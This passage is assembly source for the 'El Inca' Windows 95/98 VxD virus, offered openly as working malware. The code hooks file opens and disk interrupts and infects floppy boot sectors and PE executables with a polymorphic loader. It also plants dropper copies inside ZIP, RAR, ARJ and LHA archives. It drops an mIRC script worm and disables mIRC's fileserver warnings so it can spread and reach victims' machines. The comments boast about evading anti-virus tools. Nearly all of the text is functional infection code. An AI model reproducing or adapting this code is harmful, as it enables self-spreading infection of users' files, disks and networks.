         call AllocMemory
         jz ErrorDone
         mov edi, eax
         mov ecx, [PolyDOSFileSize]
         add ecx, PELoaderSize
         call peng                             ;make our cool PE poly (32bit)
         push HEAPNOCOPY
         mov [PolyPESize], ecx
         push ecx
         push edx
         VMMCall _HeapReAllocate
         add esp, 12
         mov [PolyPEBuffer], eax
  InstallAPIHook:
         mov eax, offset32 FONO98_File_System
         push eax                              ;install our file hook
         VxDCall IFSMgr_InstallFileSystemApiHook
         add esp, 4
         mov [NextHook], eax
  InstallV86Hook:
         mov eax, 13h                          ;install our disk hook
         mov esi, offset32 FONO98_Disk_System
         VMMCall Hook_V86_Int_Chain
         clc
         db 0b0h                               ;from here, is a mov al, xx
  ErrorDone:
         db 0fdh                               ;from here, is a stc ;)
         ret
EndProc FONO98_Device_Init



BeginProc FONO98_Disk_System
         pushad
         cmp [FloppyInUse], 0
         jne Exit13Error                       ;dont reenter
         inc [FloppyInUse]
         cmp [OurFile], 0                      ;we're infecting?
         jnz Exit13
         movzx eax, word ptr [ebp.Client_AX]
         movzx ecx, word ptr [ebp.Client_CX]
         movzx edx, word ptr [ebp.Client_DX]
         cmp ax, 201h
         jne Exit13
         cmp cx, 1
         jne Exit13
         or dx, dx
         jnz Exit13                            ;if not floppy boot, exit
  InfectBoot:
         mov ebx, offset32 SectorBuffer
         VxDInt 13h
         jc Exit13
         mov ax, word ptr [ebx]
         cmp al, 0ebh                          ;if sector dont start with a
         jne Exit13                            ;short jump, bail out
         movzx eax, ah
         lea eax, [ebx+eax+2]                  ;calculate destination of
         cmp word ptr [ebx+1feh], 0aa55h       ;jump(to insert out code)
         jne Exit13
         cmp word ptr [ebx.bpb_t_s], 2880      ;is a valid 1.44 floppy?
         jne Exit13
         sub word ptr [ebx.bpb_t_s], 18*2      ;steal 36 sectorz
         push eax
         mov ecx, [PolyBootSize]
         add eax, ecx
         sub eax, ebx
         cmp eax, 510
         pop edi
         jae Exit13                            ;will our code use more space
         mov esi, [PolyBootBuffer]             ;than we have?
         rep movsb
         mov eax, 301h                         ;write our cool boot sector
         inc ecx
         VxDInt 13h
         jc Exit13
         mov eax, 312h
         sub edx, edx
         mov ecx, 4f01h
         mov ebx, [VxDCompressedBuffer]
         VxDInt 13h                            ;write first part of compressed
         jc Exit13                             ;VXD
         mov eax, 312h
         mov edx, 100h
         mov ecx, 4f01h
         mov ebx, [VxDCompressedBuffer]
         add ebx, 512*18                       ;write the second part of it
         VxDInt 13h
         jc Exit13
         mov eax, 0302h
         mov edx, 0100h
         mov ecx, 000fh                        ;write loader to the end of the
         mov ebx, offset32 BootLoader          ;root directory
         VxDInt 13h
         jc Exit13
  Exit13:
         mov [FloppyInUse], 0
  Exit13Error:
         popad
         stc                                   ;service not finished
         ret
EndProc FONO98_Disk_System



BeginProc FONO98_File_System, High_Freq
         push ebp
         mov ebp, esp
         sub esp, 20h
         cmp [ebp+12], IFSFN_Open
         jne ExitNow                           ;only hook FileOpenz
  WeAreUsingAPI:
         cmp [OurFile], 0
         jnz ExitNow                           ;recursive?
         inc [OurFile]
  GetPlainName:
         pushad
         mov ebx, offset32 FileName
         mov eax, [ebp+16]
         cmp al, -1
         je NoDrive
         add al, "@"
         mov byte ptr [ebx], al                ;if drive specificated,
         inc ebx                               ;get it
         mov byte ptr [ebx], ":"
         inc ebx
  NoDrive:
         push BCS_WANSI
         push 255
         mov eax, [ebp+28]
         mov eax, [eax+0ch]
         add eax, 4
         push eax
         push ebx
         VxDCall UniToBCSPAth                  ;make UNICODE a ASCII in our
         add sp, 16                            ;buffer
         mov esi, ebx
         add esi, eax
         sub ebx, 2
         mov byte ptr [esi], 0
         push esi
         mov eax, R0_FILEATTRIBUTES+GET_ATTRIBUTES
         mov esi, offset32 FileName
         VxDCall IFSMgr_Ring0_FileIO
         mov [FileAttr], ecx                   ;save attributes
         jc ExitCorrect
         mov eax, R0_FILEATTRIBUTES+SET_ATTRIBUTES
         xor ecx, ecx
         mov esi, offset32 FileName
         VxDCall IFSMgr_Ring0_FileIO           ;kill attributes
         pop esi
         cmp dword ptr [esi-8], '23CR'
         jne NomIRC                            ;we're opening MIRC32.EXE??
         cmp word ptr [esi-10], 'IM'
         jne NomIRC
         cmp dword ptr [esi-4], 'EXE.'
         jne NomIRC
  DropWorm:
         pushad
         mov eax, R0_OPENCREAT_IN_CONTEXT
         mov ebx, 2
         mov cx, 01b
         mov edx, 11h
         mov esi, offset32 Killer              ;create our payload file
         VxDCall IFSMgr_Ring0_FileIO
         mov ebx, eax
         jc ErrorWorm
         mov eax, R0_WRITEFILE
         mov esi, offset32 KCode               ;write payload code to it
         mov ecx, KCodeSize
         sub edx, edx
         VxDCall IFSMgr_Ring0_FileIO
         mov eax, R0_CLOSEFILE
         VxDCall IFSMgr_Ring0_FileIO           ;close it
         mov eax, R0_OPENCREAT_IN_CONTEXT
         mov ebx, 2
         xor cx, cx
         mov edx, 11h
         mov esi, offset32 MircIni             ;open MIRC.INI
         VxDCall IFSMgr_Ring0_FileIO
         mov ebx, eax
         jc ErrorWorm
         mov eax, R0_GETFILESIZE
         VxDCall IFSMgr_Ring0_FileIO
         jc ErrorWorm
         mov edx, eax
         mov eax, R0_WRITEFILE
         mov esi, offset32 IMircIni            ;set /FSERVER warnings off, so
         mov ecx, InsertSize                   ;we can access this machine
         VxDCall IFSMgr_Ring0_FileIO           ;with impunity ;)
         jc ErrorWorm
         mov eax, R0_CLOSEFILE
         VxDCall IFSMgr_Ring0_FileIO
         mov eax, R0_OPENCREAT_IN_CONTEXT
         mov ebx, 2
         mov ecx, 01b
         mov edx, 11h
         mov esi, offset32 ScriptName2         ;create SCRIPT.NOT, to avoid
         VxDCall IFSMgr_Ring0_FileIO           ;build-in worm defense in
         jc ErrorWorm                          ;mIRC
         mov ebx, eax
         mov eax, R0_CLOSEFILE
         VxDCall IFSMgr_Ring0_FileIO
         mov eax, R0_OPENCREAT_IN_CONTEXT
         mov ebx, 2
         mov ecx, 01b
         mov edx, 11h                          ;create SCRIPT.INI
         mov esi, offset32 ScriptName
         VxDCall IFSMgr_Ring0_FileIO
         jc ErrorWorm
         mov ebx, eax
         mov eax, R0_WRITEFILE
         xor edx, edx
         mov esi, offset32 ScriptIni           ;write our inet spreading worm
         mov ecx, ScriptSize                   ;and get ready to travel! :)
         VxDCall IFSMgr_Ring0_FileIO
         mov eax, R0_CLOSEFILE
         VxDCall IFSMgr_Ring0_FileIO
         mov eax, R0_OPENCREAT_IN_CONTEXT
         mov ebx, 2
         mov ecx, 01b
         mov edx, 11h
         mov esi, offset32 IncaName            ;create virus dropper for inet
         VxDCall IFSMgr_Ring0_FileIO           ;spreading
         jc ErrorWorm
         mov ebx, eax
         mov eax, R0_WRITEFILE
         xor edx, edx
         mov esi, [PolyDOSFileBuffer]
         mov ecx, [PolyDOSFileSize]
         VxDCall IFSMgr_Ring0_FileIO           ;write dropper code
         mov eax, R0_CLOSEFILE
         VxDCall IFSMgr_Ring0_FileIO           ;close it
  ErrorWorm:
         popad
  NomIRC:
         mov eax, dword ptr [esi-4]
         not eax                               ;get extension(with little
         cmp eax, not 'AHL.'                   ;encription to avoid lamerz)
         je LHAInfect
         cmp eax, not 'HZL.'
         je LHAInfect
         cmp eax, not 'KAP.'
         je LHAInfect
         cmp eax, not 'PIZ.'                   ;if archivers, go drop virus
         je InfectZIP
         cmp eax, not 'JRA.'
         je InfectARJ
         cmp eax, not 'RAR.'
         je InfectRAR
         cmp eax, not 'RCS.'
         je InfectExecutableFile
         cmp eax, not 'EXE.'                   ;if EXE or SCR, check for PE
         jne ExitUnmark

  InfectExecutableFile:
         mov eax, R0_OPENCREATFILE
         mov ebx, 2
         xor cx, cx
         mov edx, 11h
         mov esi, offset32 FileName
         VxDCall IFSMgr_Ring0_FileIO           ;open probable host
         mov [FileHandle], eax
         jc ExitUnmark
         mov ebx, eax
         mov eax, R0_GETFILESIZE
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitClose
         mov [FileSize], eax
         cmp eax, MINSIZEINFECT
         jb ExitClose                          ;if too small, exit
         mov eax, R0_READFILE
         mov esi, offset32 CrcTab
         mov ecx, 1024
         xor edx, edx
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitClose
         cmp word ptr [esi], 'ZM'
         je NEPECheck
         cmp word ptr [esi], 'MZ'
         jne ExitClose                         ;must be a EXE file

  NEPECheck:
         mov eax, [FileSize]
         cmp dword ptr [esi+3ch], 0
         jz ExitClose
         cmp dword ptr [esi+3ch], eax          ;probable PE sign in range?
         ja ExitClose

  InfectPE:
         cmp [esi+3ch], 1024
         jae ExitClose
         lea eax, [esi+3ch]
         add esi, [eax]
         cmp dword ptr [esi], 'EP'             ;must be a PE file
         jne ExitClose
         mov eax, R0_CLOSEFILE
         mov ebx, [FileHandle]
         VxDCall IFSMgr_Ring0_FileIO           ;ready to infect, close file
         mov ebp, 32*1024
         call VxDMapFile                       ;map file in memory
         jc ExitUnmark
         call InfectPEFile                     ;infect it!
         call VxDUnMapFile
         jmp ExitUnmark                        ;unmap file

                                               ;this code goes inserted in
                                               ;PE filez, after the poly
  PELoader:                                    ;decription routine
         call set_SEH
         mov esp, [esp+8]
         jmp ReturnHost                        ;if a fault happen, jump host
  set_SEH:
         xor edx, edx                          ;setup a SEH for us
         push dword ptr fs:[edx]
         mov dword ptr fs:[edx], esp
         call PEDelta
  PEDelta:
         pop ebp
         sub ebp, (offset32 PEDelta-offset32 PELoader)
         call AnaliseKernel32                  ;get GetModuleHandleA and
         jc ReturnHost                         ;GetProcAddressA from kernel32
                                               ;export table
         lea esi, [ebp+(offset32 NamePtr-offset32 PELoader)]
         lea edi, [ebp+(offset32 FAdress-offset32 PELoader)]
         cld
  GetFunctionAdress:
         lodsd
         or eax, eax
         jz EndTable
         add eax, ebp
         call MyGetProcAdress                  ;get RVA of all functionz we
         jc ReturnHost                         ;need
         stosd
         jmp GetFunctionAdress
  EndTable:
         sub eax, eax
         push eax
         push 010b
         push 2                                ;create W95INCA.COM in root
         push eax                              ;dir
         push 3
         push 80000000h+40000000h
         lea eax, [ebp+(offset32 PEName-offset32 PELoader)]
         push eax
         call dword ptr [ebp+(offset32 _CreateFile-offset32 PELoader)]
         mov ebx, eax
         inc eax
         jz ReturnHost
         push 0
         lea eax, [ebp+(offset32 nWrite-offset32 PELoader)]
         push eax
         mov eax, 12345678h
    PEDOSSize equ dword ptr $-4
         push eax
         mov eax, ebp
         add eax, offset32 PELoaderSize        ;write the DOS dropper in it
         push eax
         push ebx
         call dword ptr [ebp+(offset32 _WriteFile-offset32 PELoader)]
         push ebx                              ;close the file
         call dword ptr [ebp+(offset32 _CloseHandle-offset32 PELoader)]
         push 0
         lea eax, [ebp+(offset32 PEName-offset32 PELoader)]
         push eax                              ;f0rk DOS process
         call dword ptr [ebp+(offset32 _WinExec-offset32 PELoader)]
         push 3000                             ;have 3 seconds to run
         call dword ptr [ebp+(offset32 _Sleep-offset32 PELoader)]
         lea eax, [ebp+(offset32 PEName-offset32 PELoader)]
         push eax                              ;delete the dropper
         call dword ptr [ebp+(offset32 _DeleteFile-offset32 PELoader)]
  ReturnHost:
         xor edx, edx
         pop dword ptr fs:[edx]
         pop edx
         mov eax, 12345678h                    ;set base
  LoadBase equ dword ptr $-4
         add eax, 12345678h
  OldIP  equ dword ptr $-4                     ;add host entry_point
         push eax
         ret

  AnaliseKernel32:
         mov edx, 0bff70000h                   ;base of KERNEL32 in win95/98
         mov eax, edx
         mov ebx, eax
         add eax, [eax+3ch]
         add ebx, [eax+120]
         lea eax, [ebp+(offset32 gmh-offset32 PELoader)]
                                               ;string is 17 bytes long
         mov [ebp+(offset32 szSearch-offset32 PELoader)], 17
                                               ;and setup pointer
         mov [ebp+(offset32 strSearch-offset32 PELoader)], eax
         call SearchET                         ;search export tabel for it
         jc a_error
         mov dword ptr [ebp+(offset32 pGetModuleHandle-offset32 PELoader)], eax
         lea eax, [ebp+(offset32 gpa-offset32 PELoader)]
                                               ;string is 15 bytes long
         mov [ebp+(offset32 szSearch-offset32 PELoader)], 15
                                               ;and setup pointer
         mov [ebp+(offset32 strSearch-offset32 PELoader)], eax
         call SearchET
         jc a_error
         mov dword ptr [ebp+(offset32 pGetProcAdress-offset32 PELoader)], eax
         lea eax, [ebp+(offset32 kernel-offset32 PELoader)]
         push eax
         mov eax, [ebp+(offset32 pGetModuleHandle-offset32 PELoader)]
         call eax                              ;get KERNEL32 module
         mov dword ptr [ebp+(offset32 pKernel32Adress-offset32 PELoader)], eax
  a_error:
         ret

  MyGetProcAdress:
         push eax
         push dword ptr [ebp+(offset32 pKernel32Adress-offset32 PELoader)]
         mov eax, [ebp+(offset32 pGetProcAdress-offset32 PELoader)]
         call eax
         or eax, eax                           ;call GetProcAddress to get
         jz GPAError                           ;all RVA we need
         test al, 12h
       org $-1                                 ;the good'n'old trick again ;)
  GPAError:
         stc
         ret

  SearchET:
         mov eax, [ebx+32]                     ;search export table of
         add eax, edx                          ;KERNEL32, searching the
  ff:
         mov esi, [eax]                        ;the names, then the ordinal
         or esi, esi                           ;and, finally the RVA pointerz
         jz fuck
         add esi, edx
         mov edi, 12345678h
   strSearch equ dword ptr $-4
         mov ecx, 12345678h
   szSearch equ dword ptr $-4
         rep cmpsb
         jz found
         add eax, 4
         jmp ff
  found:
         sub eax, [ebx+32]
         sub eax, edx
         shr eax, 1
         add eax, [ebx+36]
         add eax, edx
         movzx eax, word ptr [eax]
         shl eax, 2
         add eax, [ebx+28]
         add eax, edx
         mov eax, [eax]
         add eax, edx
         mov cl, 12h
       org $-1
  fuck:
         stc
         ret

kernel   db 'KERNEL32', 0

nWrite             dd 0

pGetProcAdress     dd 0
pGetModuleHandle   dd 0
pKernel32Adress    dd 0bff70000h

gpa      db 'GetProcAddress', 0
gmh      db 'GetModuleHandleA', 0

sCreateFile        db 'CreateFileA', 0
sWriteFile         db 'WriteFile', 0
sCloseHandle       db 'CloseHandle', 0
sWinExec           db 'WinExec', 0
sDeleteFile        db 'DeleteFileA', 0
sSleep             db 'Sleep', 0

NamePtr            equ this byte
                   dd (offset32 sCreateFile-offset32 PELoader)
                   dd (offset32 sWriteFile-offset32 PELoader)
                   dd (offset32 sCloseHandle-offset32 PELoader)
                   dd (offset32 sWinExec-offset32 PELoader)
                   dd (offset32 sDeleteFile-offset32 PELoader)
                   dd (offset32 sSleep-offset32 PELoader)
                   dd 0

PEName             db 'C:\W95INCA.COM', 0

FAdress            equ this byte
_CreateFile        dd 0
_WriteFile         dd 0
_CloseHandle       dd 0
_WinExec           dd 0
_DeleteFile        dd 0
_Sleep             dd 0

PELoaderEnd        equ this byte

PELoaderSize       equ offset32 PELoaderEnd - offset32 PELoader


  InfectPEFile:
         mov ebp, [esi+3ch]                    ;esi point to maped base
         add ebp, esi                          ;ebp point to PE header
         mov eax, 12345678h
         cmp dword ptr [ebp+58h], eax          ;is already infected?
         mov dword ptr [ebp+58h], eax
         je PE_done
         mov eax, dword ptr [ebp+52]
         cmp eax, 400000h                      ;normal base for appz
         mov [LoadBase], eax
         jne PE_done
         movzx eax, word ptr [ebp+4h]
         test eax, 2000h                       ;not infect DLL
         jnz PE_done
         movzx ecx, word ptr [ebp+6]           ;numba of sectionz
         mov eax, 40
         sub edx, edx
         mul ecx
         add eax, ebp
         add eax, 24
         movzx ecx, word ptr [ebp+20]          ;header size
         add eax, ecx
         mov edi, eax                          ;edi point to free entry
         mov edx, eax
         mov ecx, 40
         sub eax, eax
         repz scasb                            ;is really a free entry?
         jnz PE_done
         inc word ptr [ebp+6]                  ;inc number of sectionz
         call rnd                              ;make new name
         and eax, 11b
         add eax, 4
         mov ecx, eax
         mov edi, edx
  mName:
         call rnd                              ;random letter for a random
         and eax, 01111b                       ;name
         add al, 'A'
         stosb
         loop mName
         mov edi, edx
         mov dword ptr [edi+36], 0e0000040h    ;set section attribz
         mov eax, [edi-40+12]                  ;prev virtual address
         add eax, [edi-40+08]                  ;prev virtual size
         call ObjAlign
         mov [edi+12], eax                     ;virtual address
         mov eax, [edi-40+16]                  ;prev offset to data
         add eax, [edi-40+20]                  ;prev size of data
         call FileAlign
         mov [edi+20], eax                     ;offset to data
         push eax
         mov eax, [PolyPESize]
         add eax, [totsize]
         push eax
         call ObjAlign
         mov [edi+8], eax
         add [ebp+80], eax
         pop eax
         call FileAlign
         mov [edi+16], eax
         mov eax, [edi+12]
         mov ebx, [ebp+28h]
         mov [ebp+28h], eax
         mov [OldIP], ebx
         mov eax, [edi+20]
         add eax, [edi+16]
         mov [VMF_size], eax
         pop edi
         add edi, [VMF_base]
         mov esi, [PolyPEBuffer]
         mov ecx, [PolyPESize]
         rep movsb                             ;zopy PE poly to end of file
         mov ecx, 30000h
         call AllocMemory
         push eax
         push edi
         push eax
         mov edi, eax
         mov esi, offset32 PELoader            ;copy the PE loader
         mov ecx, PELoaderSize
         rep movsb
         mov esi, [PolyDOSFileBuffer]
         mov ecx, [PolyDOSFileSize]
         rep movsb                             ;and the DOS loader
         pop esi
         pop edi
         call encript_pe                       ;encript virus code
         pop eax
         call DeAllocMemory
         inc dword ptr [VMF_sucess]            ;is infected!
  PE_done:
         ret

ObjAlign:
         mov ecx, [ebp+56]
         jmp AlignThis
FileAlign:
         mov ecx, [ebp+60]
  AlignThis:
         xor edx, edx
         div ecx
         or edx, edx
         jz sAlign                             ;dont waste aligns when isnt
         inc eax                               ;need
  sAlign:
         mul ecx
         ret


  LHAInfect:
         bt [FileAttr], 0
         jc ExitUnmark                         ;if read-only, exit
         call PreparateDropper                 ;(is our marker)
         dec ebp
         mov edi, offset32 LHAFilename
         call Random4Name                      ;create random name
         mov ecx, [PolyDOSFileSize]
         mov [LHACompressedSize], ecx
         mov [LHAUncompressedSize], ecx
         mov eax, R0_READFILE
         mov ecx, 2
         mov edx, 3
         mov esi, offset32 Pad
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitFree
         xor eax, eax
         xchg word ptr [esi], ax
         cmp ax, 'hl'
         jne ExitFree                          ;is really a LHA/LHZ shit?
         xor ebx, ebx
         mov ecx, LHAHeaderSize-2
         mov esi, offset32 LHAMethod
  CheckSumLoop:
         lodsb
         add bl, al
         loop CheckSumLoop                     ;funny header checksum loop
         mov [LHAHeaderCRC], bl
         mov eax, R0_WRITEFILE
         mov ebx, [FileHandle]
         mov ecx, LHAHeaderSize
         mov esi, offset32 LHASig
         mov edx, ebp
         add ebp, ecx
         VxDCall IFSMgr_Ring0_FileIO
         mov eax, R0_WRITEFILE
         mov ecx, [PolyDOSFileSize]
         mov edx, ebp
         add ebp, ecx
         mov esi, [BufferOneHandle]
         VxDCall IFSMgr_Ring0_FileIO           ;write it
         mov eax, R0_WRITEFILE
         mov ecx, 1
         mov edx, ebp
         mov esi, offset32 Pad
         VxDCall IFSMgr_Ring0_FileIO
         jmp ExitRO

  InfectZIP:
         bt [FileAttr], 0
         jc ExitUnmark
         call PreparateDropper                 ;create dropper
         mov [ZIPRCRC32], eax
         mov [ZIPLCRC32], eax
         mov ecx, [PolyDOSFileSize]
         mov [ZIPRCompressed], ecx
         mov [ZIPRUncompressed], ecx           ;set some ZIP stuff
         mov [ZIPLCompressed], ecx
         mov [ZIPLUncompressed], ecx
         mov edi, offset32 ZIPRFileName
         call Random4Name                      ;random name
         mov eax, dword ptr [ZIPRFileName]
         mov dword ptr [ZIPLFilename], eax
         mov eax, R0_READFILE
         mov ecx, ZIPEHeaderSize
         sub ebp, ecx
         mov edx, ebp
         mov esi, offset32 ZIPReadBuffer
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitFree
         cmp word ptr [ZIPEHeaderId], 'KP'     ;is a ZIP marker
         jne ExitFree
         cmp word ptr [ZIPSignature], 0605h
         jne ExitFree
         cmp dword ptr [ZIPNoDisk], 0
         jnz ExitFree
         inc word ptr [ZIPEntryDisk]
         inc word ptr [ZIPEntrysDir]
         add dword ptr [ZIPSizeDir], ZIPRHeaderSize
         mov eax, [ZIPOffsetDir]
         mov [ZIPROffsetLHeaderR], eax
         mov ebp, eax
         mov ecx, [ZIPSizeDir]
         call AllocMemory
         jz ExitFree
         mov [BufferTwoHandle], eax
         mov esi, eax
         mov eax, R0_READFILE
         mov ecx, [ZIPSizeDir]
         mov edx, ebp
         VxDCall IFSMgr_Ring0_FileIO           ;read tonz of headers and
         jc ExitDealloc                        ;write they back after
         cld                                   ;modificationz
         mov ecx, ZIPRHeaderSize               ;(ZIP really sux)
         mov edi, [BufferTwoHandle]
         add edi, [ZIPSizeDir]
         sub edi, ecx
         mov esi, offset32 ZIPRHeaderId
         rep movsb
         mov eax, R0_WRITEFILE
         mov ecx, offset32 ZIPReadBuffer-offset32 ZIPLHeaderId
         mov edx, ebp
         add ebp, ecx
         mov esi, offset32 ZIPLHeaderId
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitDealloc
         mov eax, R0_WRITEFILE
         mov ecx, [PolyDOSFileSize]
         mov edx, ebp
         add ebp, ecx
         mov [ZIPOffsetDir], ebp
         mov esi, [BufferOneHandle]
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitDealloc
         mov eax, R0_WRITEFILE
         mov ecx, [ZIPSizeDir]
         mov edx, ebp
         add ebp, ecx
         mov esi, [BufferTwoHandle]
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitDealloc
         mov eax, R0_WRITEFILE
         mov ecx, ZIPEHeaderSize
         mov edx, ebp
         mov esi, offset32 ZIPReadBuffer
         VxDCall IFSMgr_Ring0_FileIO
  ExitDealloc:
         mov eax, [BufferTwoHandle]
         call DeallocMemory
         jmp ExitRO

  InfectRAR:
         bt [FileAttr], 0
         jc ExitUnmark                         ;bahh... the same shit, but
         call PreparateDropper                 ;this time for RAR
         mov [RARFileCRC], eax
         mov edi, offset32 RARFileName
         call Random4Name
         mov ecx, [PolyDOSFileSize]
         mov [RARCompressedSize], ecx
         mov [RARUncompressedSize], ecx
         mov eax, R0_READFILE
         mov ecx, 4
         xor edx, edx
         mov esi, offset32 Pad
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitFree
         cmp [esi], '!raR'
         jne ExitFree
         mov esi, offset32 RARHeaderType
         mov edi, offset32 RARHeaderEnd-offset32 RARHeaderType
         call CRC32
         mov [RARHeaderCRC], cx
         mov eax, R0_WRITEFILE
         mov ecx, offset32 RARHeaderEnd-offset32 RARHeaderCRC
         mov esi, offset32 RARHeaderCRC
         mov edx, ebp
         add ebp, ecx
         VxDCall IFSMgr_Ring0_FileIO
         mov eax, R0_WRITEFILE
         mov ecx, [PolyDOSFileSize]
         mov edx, ebp
         mov esi, [BufferOneHandle]
         VxDCall IFSMgr_Ring0_FileIO
         jmp ExitRO

  InfectARJ:
         bt [FileAttr], 0
         jc ExitUnmark
         call PreparateDropper                 ;uhh... again for ARJ
         sub ebp, 4
         mov [ARJFileCRC], eax                 ;(i only do this because there
         mov edi, offset32 ARJFilename         ;stupid peoples that run new
         call Random4Name                      ;strange filez)
         mov ecx, [PolyDOSFileSize]
         mov [ARJCompressedSize], ecx
         mov [ARJUncompressedSize], ecx
         mov eax, R0_READFILE
         mov ecx, 2
         xor edx, edx
         mov esi, offset32 Pad
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitFree
         cmp word ptr [esi], 0ea60h
         jne ExitFree
         mov edi, offset32 ARJHeaderCRC-offset32 ARJ1HeaderSize
         mov esi, offset32 ARJ1HeaderSize
         call CRC32
         mov [ARJHeaderCRC], eax
         mov eax, R0_WRITEFILE
         mov ecx, offset32 ARJEnd-offset32 ARJHeaderId
         mov esi, offset32 ARJHeaderId
         mov edx, ebp
         add ebp, ecx
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitFree
         mov eax, R0_WRITEFILE
         mov ecx, [PolyDOSFileSize]
         mov edx, ebp
         add ebp, ecx
         mov esi, [BufferOneHandle]
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitFree
         mov eax, R0_WRITEFILE
         mov ecx, 4
         mov edx, ebp
         mov esi, offset32 ARJEnd
         VxDCall IFSMgr_Ring0_FileIO

  ExitRO:
         or [FileAttr], 01b                      ;set inf marker(avoid lame
  ExitFree:                                      ;AVs like TBCLEAN, that cant
         mov eax, [BufferOneHandle]              ;clean r-o file)
         call DeAllocMemory
  ExitClose:
         mov eax, R0_CLOSEFILE
         mov ebx, [FileHandle]
         VxDCall IFSMgr_Ring0_FileIO
  ExitUnmark:
         mov eax, R0_FILEATTRIBUTES+SET_ATTRIBUTES
         mov ecx, [FileAttr]
         mov esi, offset32 FileName
         VxDCall IFSMgr_Ring0_FileIO             ;restore attribz
         popad

  ExitCorrect:
         mov [OurFile], 0
  ExitNow:
         mov eax, [ebp+28]
         push eax
         mov eax, [ebp+24]
         push eax
         mov eax, [ebp+20]
         push eax
         mov eax, [ebp+16]
         push eax
         mov eax, [ebp+12]
         push eax
         mov eax, [ebp+8]
         push eax
         mov eax, [nexthook]
         call [eax]                            ;continue next caller
         add esp, 20h
         leave
         ret
EndProc FONO98_File_System


         db 13d, 'El Inca virus', 13d          ;yeahh... this is the name


BeginProc PreparateDropper
         mov eax, R0_OPENCREATFILE
         mov ebx, 2
         xor cx, cx                            ;used for archivers infection
         mov edx, 11h
         mov esi, offset32 FileName
         VxDCall IFSMgr_Ring0_FileIO
         mov [FileHandle], eax                 ;here we get the size of file
         mov ebx, eax                          ;copy some shitz and calculate
         jc ExitUnmark                         ;crc16 and crc32
         mov eax, R0_GETFILESIZE
         VxDCall IFSMgr_Ring0_FileIO
         jc ExitClose
         mov ebp, eax
         cld
         mov ecx, [PolyDOSFileSize]
         call AllocMemory                      ;alloc memory for loader
         jz ExitClose                          ;and vxd
         mov [BufferOneHandle], eax
         mov edi, eax
         mov esi, [PolyDOSFileBuffer]
         mov ecx, [PolyDOSFileSize]
         push ecx
         rep movsb                             ;zopi loader
         pop ecx
         push ecx
         mov esi, [BufferOneHandle]
         push esi
         call CRC16
         mov [LHACRC16], ax                    ;only LHZ use crc16
         pop esi
         pop edi
         call CRC32                            ;crc32 returned in eax for
         ret                                   ;otherz
EndProc PreparateDropper



BeginProc VxDMapFile
         mov eax, R0_OPENCREATFILE             ;hey... i also have a map
         mov ebx, 2                            ;file function... ;)
         xor ecx, ecx
         mov [VMF_sucess], ecx
         mov edx, 11h
         mov esi, offset32 FileName
         VxDCall IFSMgr_Ring0_FileIO
         mov [VMF_handle], eax
         jc VMF_ret
         mov ebx, eax
         mov eax, R0_GETFILESIZE
         VxDCall IFSMgr_Ring0_FileIO
         mov [VMF_size], eax
         jc VMF_close
         push eax
         mov ecx, eax
         add ecx, ebp                          ;alloc enought memory for
         call AllocMemory                      ;file and workspace
         mov [VMF_base], eax
         mov esi, eax
         pop ecx
         jz VMF_close
         mov eax, R0_READFILE
         xor edx, edx                          ;map it out!
         VxDCall IFSMgr_Ring0_FileIO
         jc VMF_free
  VMF_ret:
         ret
EndProc VxDMapFile



BeginProc VxDUnMapFile
         mov ecx, 12345678h
     VMF_sucess equ dword ptr $-4
         jecxz VMF_close                       ;should we update it?
         mov eax, R0_WRITEFILE
         mov ecx, [VMF_size]
         sub edx, edx
         mov ebx, [VMF_handle]
         mov esi, [VMF_base]                   ;write infected PE
         VxDCall IFSMgr_Ring0_FileIO
  VMF_close:
         mov eax, R0_CLOSEFILE
         VxDCall IFSMgr_Ring0_FileIO           ;close it
  VMF_free:
         mov eax, [VMF_base]
         call DeAllocMemory                    ;free allocated memory
         ret
EndProc VxDUnMapFile



BeginProc AllocMemory
         push ecx
         push HEAPSWAP+HEAPZEROINIT
         push ecx
         VMMCall _HeapAllocate                 ;memory allocation routine
         add sp, 8
         or eax, eax
         pop ecx
         ret
EndProc AllocMemory



BeginProc DeAllocMemory
         push 0
         push eax
         VMMCall _HeapFree
         add sp, 8
         ret
EndProc DeAllocMemory



BeginProc CRC32
         cld
         push ebx
         mov ecx, -1                           ;look at this!!!!
         mov edx, ecx
  NextByteCRC:
         xor eax, eax                          ;our crc32 dont need huge
         xor ebx, ebx                          ;tables or shit like...
         lodsb
         xor al, cl                            ;all calculated at runtime
         mov cl, ch
         mov ch, dl
         mov dl, dh
         mov dh, 8
  NextBitCRC:
         shr bx, 1
         rcr ax, 1
         jnc NoCRC
         xor ax, 08320h
         xor bx, 0edb8h
  NoCRC:
         dec dh
         jnz NextBitCRC
         xor ecx, eax
         xor edx, ebx
         dec di
         jnz NextByteCRC
         not edx
         not ecx
         pop ebx
         mov eax, edx
         rol eax, 16
         mov ax, cx                            ;thx2zenghxi
         ret
EndProc CRC32

       VIRSIZE  equ 4000H

gldr:
       cld                                     ;our 16bit poly engine
       mov [pDOSBase], esi                     ;designed for boot and dropperz
       mov edi, offset32 rgtbl
       sub edx, edx
       mov ebx, edx
       push edi
       mov eax, edx
       mov dword ptr [edi-4], eax
       mov ecx, 8
       rep stosw                               ;init regz mirrors
       pop edi
       xchg esi, edi
       mov byte ptr [opcode1], 0b8h
       mov byte ptr [opcode2], 89h
       mov word ptr [_sp], -1
       mov byte ptr [gtype], gfl
 @a1:
       mov ecx, 8
       call creg
       call gopc
       push edi
       mov edi, esi
       sub eax, eax
       repnz scasw                             ;all regz initialized?
       pop edi
       jz @a1
       call rnd
       and eax, 011111b
       adc eax, 8
       mov ecx, eax
 @a2:
       call garble                             ;create some junk
       loop @a2
       cmp byte ptr [maq], 0
       jne maqfile
       mov eax, 00000202h                      ;floppy paramz
       mov ebx, 0001000fh                      ;hi=reg
       mov edx, 00020100h                      ;lo=value
       mov ebp, 00037e00h
       call mxrg                               ;mix order
       mov byte ptr [gtype], gnf
       push eax
       push ebx
       push edx
       push ebp
       mov ecx, 4
 @a8:
       xor eax, eax
       mov edx, eax
       pop ax
       pop dx
       bts word ptr [rgusg], dx
       call mrval
       push ecx
